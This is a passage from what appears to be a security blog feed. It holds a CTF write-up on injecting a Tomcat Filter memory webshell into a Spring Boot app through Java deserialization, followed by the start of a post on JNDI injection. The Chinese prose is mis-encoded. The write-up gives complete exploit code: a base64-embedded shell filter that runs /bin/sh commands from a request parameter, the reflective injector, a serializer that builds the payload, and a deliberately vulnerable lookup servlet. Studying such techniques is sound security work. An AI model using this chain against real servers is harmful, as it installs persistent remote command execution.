contextField.get(servletContext);</span><br><span class="line"></span><br><span class="line"><span class="type">Field</span> <span class="variable">stdContextField</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">stdContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) stdContextField.get(applicationContext);</span><br></pre></td></tr></table></figure><p>å¯¹æ¯”ä¸€ä¸‹æ­£å¸¸Tomcatè·å–<code>StandardContext</code>çš„è¿‡ç¨‹</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getServletContext();</span><br><span class="line"><span class="type">Field</span> <span class="variable">applicationContextField</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">applicationContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) applicationContextField.get(servletContext);</span><br><span class="line"><span class="type">Field</span> <span class="variable">standardContextField</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">standardContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">context</span> <span class="operator">=</span> (StandardContext) standardContextField.get(applicationContext);</span><br></pre></td></tr></table></figure><p>å…¶å®å°±æ˜¯æˆ‘ä»¬æ— æ³•ç›´æ¥è·å–<code>request</code>ï¼Œåœ¨SpringBootä¸­ï¼Œ<code>request</code>è¢«å°è£…ä¸º<code>ServletRequestAttributes</code>çš„ä¸€ä¸ªå­—æ®µï¼Œ<code>ServletRequestAttributes</code>å¯ä»¥é€šè¿‡è°ƒç”¨<code>RequestContextHolder</code>çš„<code>getRequestAttributes()</code>æ–¹æ³•è·å–ï¼Œè¿™ä¸ä»£è¡¨<code>ServletRequestAttributes</code>è¢«åŒ…è£…è¿›äº†<code>RequestContextHolder</code>ï¼Œè€Œæ˜¯å› ä¸º<code>RequestContextHolder</code>çš„ç‰¹æ®Šæ€§ï¼Œ<code>getRequestAttributes()</code>è¿”å›çš„æ˜¯å½“å‰çº¿ç¨‹çš„<code>ServletRequestAttributes</code>è€Œä¸æ˜¯ä¸€ä¸ªç®€å•çš„ã€ä¸å˜çš„å­—æ®µï¼Œè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆä¸ç›´æ¥è·å–<code>ServletRequestAttributes</code>åå°„è°ƒç”¨<code>getRequest()</code>ï¼Œå› ä¸ºè¿™æ ·æ ¹æœ¬æ— æ³•ä¿è¯è·å–åˆ°çš„<code>request</code>å¯¹è±¡æ˜¯ä»å“ªæ¥çš„</p><p>æ‰€ä»¥å®Œæ•´çš„æ¶æ„è¢«åŠ è½½ç±»ï¼Œè¯¥ç±»ä¸ºäº†å¥‘åˆTemplatesImplçš„è¦æ±‚éœ€è¦ç»§æ‰¿<code>AbstractTranslate</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InjectClass</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Class&lt;?&gt; contextHolderClass = Class.forName(<span class="string">&quot;org.springframework.web.context.request.RequestContextHolder&quot;</span>);</span><br><span class="line">            <span class="type">Method</span> <span class="variable">getRequestAttributesMethod</span> <span class="operator">=</span> contextHolderClass.getMethod(<span class="string">&quot;getRequestAttributes&quot;</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">attributes</span> <span class="operator">=</span> getRequestAttributesMethod.invoke(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">            Class&lt;?&gt; requestAttributesClass = Class.forName(<span class="string">&quot;org.springframework.web.context.request.ServletRequestAttributes&quot;</span>);</span><br><span class="line">            <span class="type">Method</span> <span class="variable">getRequestMethod</span> <span class="operator">=</span> requestAttributesClass.getMethod(<span class="string">&quot;getRequest&quot;</span>);</span><br><span class="line">            <span class="type">ServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> (ServletRequest) getRequestMethod.invoke(attributes);</span><br><span class="line">            <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getServletContext();</span><br><span class="line"></span><br><span class="line">            <span class="type">Field</span> <span class="variable">contextField</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">            contextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">applicationContext</span> <span class="operator">=</span> contextField.get(servletContext);</span><br><span class="line"></span><br><span class="line">            <span class="type">Field</span> <span class="variable">stdContextField</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">            stdContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) stdContextField.get(applicationContext);</span><br><span class="line"></span><br><span class="line">            <span class="type">String</span> <span class="variable">sourceCode</span> <span class="operator">=</span> <span class="string">&quot;yv66vgAAADQAiwoAHQBPCABACwBQAFEHAFIKAAQATwcAUwcAVAgAVQgAVgoABgBXCgAGAFgHAFkHAFoKAFsAXAoADQBdCgAMAF4KAAwAXwoABABgCABhBwBiBwBjCgAVAGQIAGULAGYAZwsAZgBoCgBpAGoLAGsAbAcAbQcAbgcAbwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAiTGNvbS9leGFtcGxlL2RlbW8vRG9nL1NoZWxsRmlsdGVyOwEABGluaXQBAB8oTGphdmF4L3NlcnZsZXQvRmlsdGVyQ29uZmlnOylWAQAMZmlsdGVyQ29uZmlnAQAcTGphdmF4L3NlcnZsZXQvRmlsdGVyQ29uZmlnOwEACkV4Y2VwdGlvbnMHAHABAAhkb0ZpbHRlcgEAWyhMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7TGphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW47KVYBAAdwcm9jZXNzAQATTGphdmEvbGFuZy9Qcm9jZXNzOwEABnJlYWRlcgEAGExqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyOwEABGxpbmUBABJMamF2YS9sYW5nL1N0cmluZzsBAAFlAQAVTGphdmEvaW8vSU9FeGNlcHRpb247AQAGb3V0cHV0AQAZTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEADnByb2Nlc3NCdWlsZGVyAQAaTGphdmEvbGFuZy9Qcm9jZXNzQnVpbGRlcjsBAANyZXEBAB5MamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDsBAANyZXMBAB9MamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7AQAFY2hhaW4BABtMamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbjsBAANjbWQBAA1TdGFja01hcFRhYmxlBwBtBwBxBwByBwBzBwBUBwBSBwBTBwB0BwBZBwBiAQAHZGVzdHJveQEAClNvdXJjZUZpbGUBABBTaGVsbEZpbHRlci5qYXZhDAAfACAHAHEMAHUAdgEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyAQAYamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyAQAQamF2YS9sYW5nL1N0cmluZwEABy9iaW4vc2gBAAItYwwAHwB3DAB4AHkBABZqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyAQAZamF2YS9pby9JbnB1dFN0cmVhbVJlYWRlcgcAdAwAegB7DAAfAHwMAB8AfQwAfgB/DACAAIEBAAEKAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAGmphdmEvbGFuZy9SdW50aW1lRXhjZXB0aW9uDAAfAIIBABd0ZXh0L2h0bWw7Y2hhcnNldD1VVEYtOAcAcgwAgwCEDACFAIYHAIcMAIgAiQcAcwwALACKAQAgY29tL2V4YW1wbGUvZGVtby9Eb2cvU2hlbGxGaWx0ZXIBABBqYXZhL2xhbmcvT2JqZWN0AQAUamF2YXgvc2VydmxldC9GaWx0ZXIBAB5qYXZheC9zZXJ2bGV0L1NlcnZsZXRFeGNlcHRpb24BABxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0AQAdamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2UBABlqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluAQARamF2YS9sYW5nL1Byb2Nlc3MBAAxnZXRQYXJhbWV0ZXIBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAAVzdGFydAEAFSgpTGphdmEvbGFuZy9Qcm9jZXNzOwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBABMoTGphdmEvaW8vUmVhZGVyOylWAQAIcmVhZExpbmUBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEAGChMamF2YS9sYW5nL1Rocm93YWJsZTspVgEADnNldENvbnRlbnRUeXBlAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAJZ2V0V3JpdGVyAQAXKClMamF2YS9pby9QcmludFdyaXRlcjsBABNqYXZhL2lvL1ByaW50V3JpdGVyAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL09iamVjdDspVgEAQChMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7KVYAIQAcAB0AAQAeAAAABAABAB8AIAABACEAAAAvAAEAAQAAAAUqtwABsQAAAAIAIgAAAAYAAQAAAAgAIwAAAAwAAQAAAAUAJAAlAAAAAQAmACcAAgAhAAAANQAAAAIAAAABsQAAAAIAIgAAAAYAAQAAAAwAIwAAABYAAgAAAAEAJAAlAAAAAAABACgAKQABACoAAAAEAAEAKwABACwALQACACEAAAGhAAYACgAAAJkrEgK5AAMCADoEGQTGAIS7AARZtwAFOgW7AAZZBr0AB1kDEghTWQQSCVNZBRkEU7cACjoGGQa2AAs6B7sADFm7AA1ZGQe2AA63AA+3ABA6CBkItgARWToJxgATGQUZCbYAEhITtgASV6f/6KcADzoHuwAVWRkHtwAWvywSF7kAGAIALLkAGQEAGQW2ABqnAAstKyy5ABsDALEAAQA0AGsAbgAUAAMAIgAAAEIAEAAAABAACgARAA8AEgAYABQANAAWADsAFwBQABkAWwAaAGsAHgBuABwAcAAdAHoAHwCCACAAjQAhAJAAIgCYACQAIwAAAHAACwA7ADAALgAvAAcAUAAbADAAMQAIAFgAEwAyADMACQBwAAoANAA1AAcAGAB1ADYANwAFADQAWQA4ADkABgAAAJkAJAAlAAAAAACZADoAOwABAAAAmQA8AD0AAgAAAJkAPgA/AAMACgCPAEAAMwAEAEEAAAAwAAb/AFAACQcAQgcAQwcARAcARQcARgcARwcASAcASQcASgAA+QAaQgcASwv5ABUHACoAAAAGAAIAFAArAAEATAAgAAEAIQAAACsAAAABAAAAAbEAAAACACIAAAAGAAEAAAApACMAAAAMAAEAAAABACQAJQAAAAEATQAAAAIATg==&quot;</span>;</span><br><span class="line">            <span class="type">byte</span>[] bytes = Base64.getDecoder().decode(sourceCode);</span><br><span class="line">            <span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line">            <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class);</span><br><span class="line">            method.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            Class&lt;?&gt; clazz = (Class&lt;?&gt;) method.invoke(classLoader, bytes, <span class="number">0</span>, bytes.length);</span><br><span class="line">            <span class="type">Filter</span> <span class="variable">filterShell</span> <span class="operator">=</span> (Filter) clazz.newInstance();</span><br><span class="line"></span><br><span class="line">            <span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">            filterDef.setFilterName(<span class="string">&quot;ShellFilter&quot;</span>);</span><br><span class="line">            filterDef.setFilter(filterShell);</span><br><span class="line">            filterDef.setFilterClass(filterShell.getClass().getName());</span><br><span class="line">            standardContext.addFilterDef(filterDef);</span><br><span class="line"></span><br><span class="line">            Constructor&lt;?&gt; constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">            constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">            filterMap.setFilterName(<span class="string">&quot;ShellFilter&quot;</span>);</span><br><span class="line">            filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">            standardContext.addFilterMap(filterMap);</span><br><span class="line"></span><br><span class="line">            <span class="type">Field</span> <span class="variable">filterConfigsField</span> <span class="operator">=</span> StandardContext.class.getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">            filterConfigsField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            Map&lt;String, ApplicationFilterConfig&gt; filterConfigs = (Map&lt;String, ApplicationFilterConfig&gt;) filterConfigsField.get(standardContext);</span><br><span class="line">            filterConfigs.put(<span class="string">&quot;ShellFilter&quot;</span>, filterConfig);</span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">&quot;success&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥æ˜¯å®Œæ•´çš„Exp</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ExpForMemShell</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] shell = Files.readAllBytes(Paths.get(<span class="string">&quot;C:\\Users\\leyi\\IntelliJTest\\serialize\\Moeserialize\\out\\production\\Moeserialize\\com\\example\\demo\\Dog\\InjectClass.class&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        Class&lt;?&gt; clazz = templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactory.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates, <span class="string">&quot;Shell&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodes.set(templates, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;shell&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">Dog</span> <span class="variable">EvilDog</span> <span class="operator">=</span> setDogFields(templates, <span class="string">&quot;getClass&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">        HashSet&lt;Dog&gt; set = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">        set.add(EvilDog);</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; dogClass = EvilDog.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">objects</span> <span class="operator">=</span> dogClass.getDeclaredField(<span class="string">&quot;object&quot;</span>);</span><br><span class="line">        objects.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        objects.set(EvilDog, templates);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">methodName</span> <span class="operator">=</span> dogClass.getDeclaredField(<span class="string">&quot;methodName&quot;</span>);</span><br><span class="line">        methodName.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        methodName.set(EvilDog, <span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line">        serialize(set);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Dog <span class="title function_">setDogFields</span><span class="params">(Object object,String methodName,Class&lt;?&gt;[] paramTypes,Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="keyword">return</span> Exp.setDogFields(object, methodName, paramTypes, args);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(Files.newOutputStream(Paths.get(<span class="string">&quot;moeSerialForShell.ser&quot;</span>)));</span><br><span class="line">        oos.writeObject(object);</span><br><span class="line">        <span class="type">byte</span>[] fileBytes = Files.readAllBytes(Paths.get(<span class="string">&quot;moeSerialForShell.ser&quot;</span>));</span><br><span class="line">        <span class="type">String</span> <span class="variable">base64Encoded</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(fileBytes);</span><br><span class="line">        System.out.println(base64Encoded);</span><br><span class="line">        Files.write(Paths.get(<span class="string">&quot;moeSerialForShell.txt&quot;</span>), base64Encoded.getBytes());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å°†å¾—åˆ°çš„payloadåœ¨æœ¬åœ°æµ‹è¯•æˆåŠŸï¼Œæ§åˆ¶å°æ‰“å°äº†<code>success</code>å­—æ ·</p><p><img src="/img/post/image-20260120154543682.png" alt="image-20260120154543682"></p><p>é¶æœºæ³¨å…¥å†…å­˜é©¬ï¼Œflagåœ¨ç¯å¢ƒå˜é‡é‡Œ</p><p><img src="/img/post/image-20260120154728056.png" alt="image-20260120154728056"></p><h2 id="åè¯"><a href="#åè¯" class="headerlink" title="åè¯"></a>åè¯</h2><p>å¾ˆå¥‡æ€ªï¼Œé¢˜ç›®ç»™çš„jaråŒ…æœ¬åœ°è¿è¡Œï¼Œä¸Šä¼ æ–‡ä»¶å±…ç„¶ä¼šç›´æ¥æŠŠæ•°æ®ç”¨GETè¯·æ±‚å‘é€ï¼Œè¿™ä¼šè§¦å‘8KBçš„é»˜è®¤æ•°æ®ä¸Šé™ï¼Œåé¢å°è¯•è‡ªå·±åœ¨IDEAä¸Šå†™ä¸€ä¸ªä¸€æ ·çš„ç¯å¢ƒè¿è¡Œï¼Œè¿™æ ·å¯ä»¥æ›´å¥½åœ°æŸ¥çœ‹æŠ¥é”™ä¿¡æ¯ã€‚æŠŠæºç å¤åˆ¶ä¸Šå»ï¼Œå‘ç°<code>DogService</code>ç±»äº§ç”Ÿäº†æŠ¥é”™</p><p><img src="/img/post/image-20260120153801060.png" alt="image-20260120153801060"></p><p><code>readObject()</code>æ–¹æ³•è¿”å›ä¸€ä¸ªObjectå¯¹è±¡ï¼Œè™½ç„¶è¿™é‡Œå¼ºè½¬æˆäº†é›†åˆç±»å‹ï¼Œä½†æ˜¯è¿˜æ˜¯ä¼šæŠ¥é”™ï¼Œè¿™é‡Œåªå…è®¸è®©<code>dog</code>çš„å£°æ˜ç±»å‹ä¸ºObjectï¼Œæ‰€ä»¥æˆ‘åœ¨å¤åŸé¢˜ç›®ç¯å¢ƒçš„æ—¶å€™åˆç¨å¾®ä¿®æ”¹äº†ä¸€ä¸‹</p><p><img src="/img/post/image-20260120154108880.png" alt="image-20260120154108880"></p><p>åé¢å°±æ˜¯ä¿®æ”¹å¯åŠ¨ç±»é…ç½®ï¼Œä¸»è¦æ˜¯ä¿®å¤äº†è¯·æ±‚æ•°æ®ä¸Šé™å’Œ<code>index.html</code>çš„è·¯å¾„</p><p><img src="/img/post/image-20260120154247466.png" alt="image-20260120154247466"></p><p>è¿™é“é™„åŠ é¢˜ä¹Ÿæ˜¯æŠ˜è…¾äº†å‡ å¤©ï¼Œç”¨å®˜æ–¹çš„åŠ¨æ€ç±»ç¼–è¯‘æ€è·¯ä¸ä»…éº»çƒ¦ï¼Œè¿˜æ€»æ˜¯åšä¸å‡ºæ¥çš„ï¼Œç°åœ¨çœ‹è¿˜æ˜¯Filterå†…å­˜é©¬å¥½ç”¨ï¼Œè¿˜æ–¹ä¾¿</p><br/>]]></content>
      
      
      <categories>
          
          <category> CTFç›¸å…³ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JNDIæ³¨å…¥</title>
      <link href="/2026/01/18/JNDI%E6%B3%A8%E5%85%A5/"/>
      <url>/2026/01/18/JNDI%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="JNDIæ³¨å…¥"><a href="#JNDIæ³¨å…¥" class="headerlink" title="JNDIæ³¨å…¥"></a>JNDIæ³¨å…¥</h1><p>é€šè¿‡JNDIå¯ä»¥ä½¿æœåŠ¡å™¨è¿œç¨‹ä¸‹è½½ç±»æ–‡ä»¶åŠ¨æ€åŠ è½½å¯¹è±¡ï¼Œå¦‚æœè¯¥ç±»æ–‡ä»¶æ˜¯ä¸€ä¸ªæ¶æ„çš„ç±»å¯¹è±¡ï¼Œåˆ™å¯ä»¥è¾¾åˆ°æ— æ–‡ä»¶æ³¨å…¥å†…å­˜é©¬çš„ç›®çš„</p><br/><h2 id="æ³¨å…¥åŸç†"><a href="#æ³¨å…¥åŸç†" class="headerlink" title="æ³¨å…¥åŸç†"></a>æ³¨å…¥åŸç†</h2><p>JNDIï¼ˆJava Naming and Directory Interfaceï¼‰Java å‘½åä¸ç›®å½•æ¥å£ï¼Œæ˜¯ Java å¹³å°çš„ä¸€ä¸ª APIã€‚JNDI å…è®¸å°†èµ„æºï¼ˆå¦‚æ•°æ®åº“è¿æ¥ã€Java å¯¹è±¡ï¼‰å­˜å‚¨åœ¨å‘½åæœåŠ¡ä¸­ã€‚ä¸ºäº†å­˜å‚¨è‡ªå®šä¹‰å¯¹è±¡ï¼ŒJNDI å¼•å…¥äº† <code>Reference</code> ç±»ï¼Œå½“å®¢æˆ·ç«¯è°ƒç”¨ <code>lookup()</code> æŸ¥è¯¢ä¸€ä¸ª Reference å¯¹è±¡æ—¶ï¼Œå¦‚æœæœ¬åœ° classpath æ‰¾ä¸åˆ°è¯¥ç±»ï¼ŒJava å°±ä¼šæ ¹æ® <code>ClassFactoryLocation</code> æŒ‡å®šçš„ URL å»è¿œç¨‹ä¸‹è½½è¿™ä¸ª <code>.class</code> æ–‡ä»¶ã€‚æ”»å‡»è€…é€šè¿‡æ§åˆ¶ JNDI æŸ¥è¯¢çš„åœ°å€ï¼Œè¯±å¯¼æœåŠ¡å™¨ä»è¿œç¨‹æ¶æ„æœåŠ¡å™¨åŠ è½½å¹¶å®ä¾‹åŒ–ä¸€ä¸ªæ¶æ„ Java ç±»ï¼Œä»è€Œå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆRCEï¼‰</p><br/><h2 id="JNDIæ³¨å…¥å†…å­˜é©¬"><a href="#JNDIæ³¨å…¥å†…å­˜é©¬" class="headerlink" title="JNDIæ³¨å…¥å†…å­˜é©¬"></a>JNDIæ³¨å…¥å†…å­˜é©¬</h2><p>æ¥ä¸‹æ¥å°è¯•ä½¿ç”¨JNDIæ³¨å…¥Filterå†…å­˜é©¬</p><p>é¦–å…ˆéœ€è¦ä¸€ä¸ªå—å®³ç«¯ï¼Œè¯¥ç«¯éœ€è¦èƒ½å¤Ÿè°ƒç”¨<code>lookup()</code>æ–¹æ³•å»åŠ è½½ldapåè®®åœ°å€ï¼Œæˆ‘ç®€å•æ”¹äº†Tomcaté»˜è®¤çš„åˆå§‹é¡µé¢ï¼Œä½¿å…¶èƒ½å¤Ÿæ¥æ”¶ä¸€ä¸ª<code>name</code>å‚æ•°å¹¶æŸ¥è¯¢</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@WebServlet(name = &quot;helloServlet&quot;, value = &quot;/hello-servlet&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String message;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">()</span> &#123;</span><br><span class="line">        message = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        response.setContentType(<span class="string">&quot;text/html&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (name != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                <span class="type">InitialContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">                context.lookup(name);</span><br><span class="line">                response.setContentType(<span class="string">&quot;text/html&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NamingException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">        out.println(<span class="string">&quot;&lt;html&gt;&lt;body&gt;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;h1&gt;&quot;</span> + message + <span class="string">&quot;&lt;/h1&gt;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;/body&gt;&lt;/html&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç”±äºJNDIä¸€æ¬¡åªèƒ½åŠ è½½å¹¶å®ä¾‹åŒ–ä¸€æ¬¡ç±»å¯¹è±¡ï¼Œåœ¨è¿™ä¸ªå¯¹è±¡ä¸­ï¼Œæˆ‘ä»¬éœ€è¦è·å–<code>StandardContext</code>ï¼Œå¹¶å°†æ¶æ„Filteræ³¨å†Œè¿›å»ï¼Œæ‰€ä»¥åœ¨æ— å‚æ„é€ æ–¹æ³•ä¸­ï¼Œæˆ‘ä»¬è¿˜éœ€è¦å°†æ¶æ„FilteråŠ¨æ€åŠ 